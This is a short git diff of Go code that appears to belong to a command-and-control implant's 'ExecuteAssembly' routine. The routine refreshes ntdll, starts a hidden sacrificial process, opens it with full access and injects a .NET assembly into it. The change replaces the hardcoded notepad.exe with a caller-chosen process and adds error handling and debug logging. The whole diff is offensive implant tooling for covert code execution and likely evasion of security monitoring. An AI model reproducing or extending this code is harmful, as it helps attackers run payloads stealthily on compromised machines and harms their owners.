@@ -302,7 +302,7 @@ func LocalTask(data []byte) error {
 	return err
 }
 
-func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) (string, error) {
+func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
 	err := RefreshPE(ntdllPath)
 	if err != nil {
 		return "", err
@@ -318,7 +318,7 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 	if len(assembly) > MAX_ASSEMBLY_LENGTH {
 		return "", fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
 	}
-	cmd := exec.Command("notepad.exe")
+	cmd := exec.Command(process)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow: true,
 	}
@@ -327,10 +327,16 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) 
 	stderrIn, _ := cmd.StderrPipe()
 
 	var errStdout, errStderr error
-	cmd.Start()
+	err = cmd.Start()
+	if err != nil {
+		//{{if .Debug}}
+		log.Println("Could not start process:", process)
+		//{{end}}
+		return "", err
+	}
 	pid := cmd.Process.Pid
 	// {{if .Debug}}
-	log.Println("[*] notepad.exe started, pid =", pid)
+	log.Printf("[*] %s started, pid = %d\n", process, pid)
 	// {{end}}
 	// OpenProcess with PROC_ACCESS_ALL
 	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
